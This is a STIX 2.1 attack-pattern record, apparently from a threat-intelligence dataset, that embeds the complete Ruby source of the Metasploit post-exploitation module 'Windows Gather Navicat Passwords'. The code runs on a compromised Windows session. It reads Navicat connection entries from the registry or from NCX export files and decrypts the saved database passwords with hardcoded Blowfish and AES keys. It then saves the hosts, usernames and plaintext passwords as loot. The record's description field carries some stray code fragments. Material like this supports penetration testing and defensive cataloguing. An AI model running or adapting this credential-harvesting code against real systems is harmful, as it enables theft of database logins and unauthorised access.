{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--239b3a40-2f61-464f-a011-622b47e67731",
    "created": "2024-08-14T16:33:11.450995Z",
    "modified": "2024-08-14T16:33:11.450998Z",
    "name": "Windows Gather Navicat Passwords",
    "description": "This module will find and decrypt stored Navicat passwords 'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/navicat.rb",
            "external_id": "navicat.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.kali-team.cn/Metasploit-Navicat-fbc1390cf57c40b5b576584c48b8e125"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n#\n# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb\n# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::File\n  # secret_key = Digest::SHA1.digest('3DC5CA39')\n  SECRET_KEY = \"B\\xCE\\xB2q\\xA5\\xE4X\\xB7J\\xEA\\x93\\x94y\\\"5C\\x91\\x873@\".freeze\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Navicat Passwords',\n        'Description' => %q{ This module will find and decrypt stored Navicat passwords },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://github.com/HyperSine/how-does-navicat-encrypt-password'],\n          [ 'URL', 'https://blog.kali-team.cn/Metasploit-Navicat-fbc1390cf57c40b5b576584c48b8e125']\n        ],\n        'Author' => [\n          'HyperSine', # Research and PoC\n          'Kali-Team <kali-team[at]qq.com>' # MSF module\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter', 'shell'],\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('NCX_PATH', [ false, 'Specify the path of the NCX export file (e.g. connections.ncx).']),\n      ]\n    )\n  end\n\n  def blowfish_encrypt(data = \"\\xFF\" * 8)\n    cipher = OpenSSL::Cipher.new('bf-ecb').encrypt\n    cipher.padding = 0\n    cipher.key_len = SECRET_KEY.length\n    cipher.key = SECRET_KEY\n    cipher.update(data) << cipher.final\n  end\n\n  def blowfish_decrypt(text)\n    cipher = OpenSSL::Cipher.new('bf-cbc').decrypt\n    cipher.padding = 0\n    cipher.key_len = SECRET_KEY.length\n    cipher.key = SECRET_KEY\n    cipher.iv = \"\\x00\" * 8\n    cipher.update(text) + cipher.final\n  end\n\n  def strxor(str, second)\n    str.bytes.zip(second.bytes).map { |a, b| (a ^ b).chr }.join\n  end\n\n  def decrypt_navicat11(encrypted_data)\n    password = ''\n    return password unless encrypted_data\n\n    iv = blowfish_encrypt\n    ciphertext = [encrypted_data].pack('H*')\n    cv = iv\n    full_round, left_length = ciphertext.length.divmod(8)\n\n    if full_round > 0\n      for i in 0..full_round - 1 do\n        t = blowfish_decrypt(ciphertext[i * 8, 8])\n        t = strxor(t, cv)\n        password += t\n        cv = strxor(cv, ciphertext[i * 8, 8])\n      end\n    end\n\n    if left_length > 0\n      cv = blowfish_encrypt(cv)\n      test_value = strxor(ciphertext[8 * full_round, left_length], cv[0, left_length])\n      password += test_value\n    end\n\n    password\n  end\n\n  def decrypt_navicat_ncx(ciphertext)\n    ciphertext = [ciphertext].pack('H*')\n    aes = OpenSSL::Cipher.new('aes-128-cbc')\n    aes.decrypt\n    aes.key = 'libcckeylibcckey'\n    aes.padding = 0\n    aes.iv = 'libcciv libcciv '\n    aes.update(ciphertext)\n  end\n\n  def navicat_store_config(config)\n    if %i[hostname service_name port username].any? { |e| config[e].blank? } || config[:password].nil?\n      vprint_warning('Key data is empty, skip saving service credential')\n      return # If any of these fields are nil or are empty (with the exception of the password field which can be empty),\n      # then we shouldn't proceed, as we don't have enough info to store a credential which someone could actually\n      # use against a target.\n    end\n\n    service_data = {\n      address: config[:hostname],\n      port: config[:port],\n      service_name: config[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_type: :password,\n      private_data: config[:password],\n      username: config[:username],\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n    create_credential_and_login(credential_data)\n  end\n\n  def parse_xml(data)\n    mxml = REXML::Document.new(data).root\n    result = []\n    mxml.elements.to_a('//Connection').each do |node|\n      host = node.attributes['Host']\n      port = node.attributes['Port']\n      proto = node.attributes['ConnType']\n      username = node.attributes['UserName']\n      name = node.attributes['ConnectionName']\n      epassword = node.attributes['Password']\n      password = decrypt_navicat_ncx(epassword)\n      result << {\n        name: name,\n        protocol: proto.downcase,\n        hostname: host,\n        port: port,\n        username: username,\n        password: password || epassword\n      }\n    end\n    print_and_save(result)\n    return result\n  end\n\n  def get_reg\n    reg_keys = Hash.new\n\n    reg_keys['mysql'] = 'HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers'\n    reg_keys['mariadb'] = 'HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMARIADB\\Servers'\n    reg_keys['mongodb'] = 'HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMONGODB\\Servers'\n    reg_keys['mssql'] = 'HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMSSQL\\Servers'\n    reg_keys['oracle'] = 'HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatOra\\Servers'\n    reg_keys['postgres'] = 'HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatPG\\Servers'\n    reg_keys['sqlite'] = 'HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatSQLite\\Servers'\n    result = []\n    reg_keys.each_pair do |db_name, reg_key|\n      subkeys = registry_enumkeys(reg_key)\n      next if subkeys.nil?\n\n      subkeys.each do |subkey|\n        enc_pwd_value = registry_getvaldata(\"#{reg_key}\\\\#{subkey}\", 'Pwd')\n        next if enc_pwd_value.nil?\n\n        username_value = registry_getvaldata(\"#{reg_key}\\\\#{subkey}\", 'UserName')\n        port_value = registry_getvaldata(\"#{reg_key}\\\\#{subkey}\", 'Port')\n        host_value = registry_getvaldata(\"#{reg_key}\\\\#{subkey}\", 'Host')\n\n        pwd_value = decrypt_navicat11(enc_pwd_value)\n        result << {\n          name: subkey,\n          protocol: db_name,\n          hostname: host_value,\n          port: port_value,\n          username: username_value,\n          password: pwd_value || enc_pwd_value\n        }\n      end\n    end\n    print_and_save(result)\n    return result\n  end\n\n  def print_and_save(results)\n    columns = [\n      'Name',\n      'Protocol',\n      'Hostname',\n      'Port',\n      'Username',\n      'Password',\n    ]\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Navicat Sessions',\n      'Columns' => columns\n    )\n    results.each do |item|\n      tbl << item.values\n      config = {\n        name: item[:name],\n        hostname: item[:hostname],\n        service_name: item[:protocol],\n        port: item[:port].nil? ? '' : item[:port],\n        username: item[:username],\n        password: item[:password]\n      }\n      navicat_store_config(config)\n    end\n    print_line(tbl.to_s)\n    if tbl.rows.count > 0\n      path = store_loot('host.navicat_session', 'text/plain', session, tbl, 'navicat_sessions.txt', 'Navicat Sessions')\n      print_good(\"Session info stored in: #{path}\")\n    end\n  end\n\n  def run\n    print_status('Gathering Navicat password information.')\n    if datastore['NCX_PATH'].present?\n      ncx_path = datastore['NCX_PATH']\n      print_status(\"Looking for #{ncx_path}\")\n      begin\n        if file_exist?(ncx_path)\n          condata = read_file(ncx_path) || ''\n          fail_with(Failure::Unknown, \"The file #{ncx_path} could not be read\") if condata.empty?\n\n          loot_path = store_loot('navicat.creds', 'text/xml', session, condata, ncx_path)\n          print_good(\"navicat.ncx saved to #{loot_path}\")\n          parse_xml(condata)\n          print_status(\"Finished processing #{ncx_path}\")\n        end\n      rescue Rex::Post::Meterpreter::RequestError\n        fail_with(Failure::Unknown, \"The file #{ncx_path} either could not be read or does not exist\")\n      end\n    else\n      get_reg\n      print_status('Finished processing from the registry')\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}